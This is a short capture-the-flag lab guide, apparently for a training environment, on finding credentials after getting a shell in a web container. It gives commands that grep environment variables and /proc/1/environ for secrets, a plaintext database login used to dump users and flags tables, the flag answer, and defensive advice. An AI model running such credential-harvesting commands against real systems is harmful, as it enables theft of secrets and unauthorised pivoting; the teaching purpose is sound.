# 03 — Credential Discovery

**Objective:** Find credentials stored insecurely in the lab environment.

## Skills practiced

- Reading environment variables from a compromised container
- Extracting credentials from config files and endpoints
- Using discovered credentials to pivot

## Steps

1. From a shell on the web container (via command injection or docker exec):
   ```bash
   env | grep -iE 'pass|secret|key|token'
   cat /proc/1/environ | tr '\0' '\n' | grep -iE 'pass|secret'
   ```

2. Query the `/backup` endpoint to retrieve the DB connection string.

3. Use discovered credentials against the PostgreSQL database:
   ```bash
   psql "postgres://app:SuperSecret1!@forge-db/appdb"
   SELECT * FROM users;
   SELECT * FROM flags;
   ```

## Flags

- `FLAG{db_creds_found}` — in the `flags` table

## Defensive notes

- Never store credentials in environment variables for sensitive workloads; use a secrets manager
- Apply principle of least privilege to database users
- Never store passwords in plaintext in the database
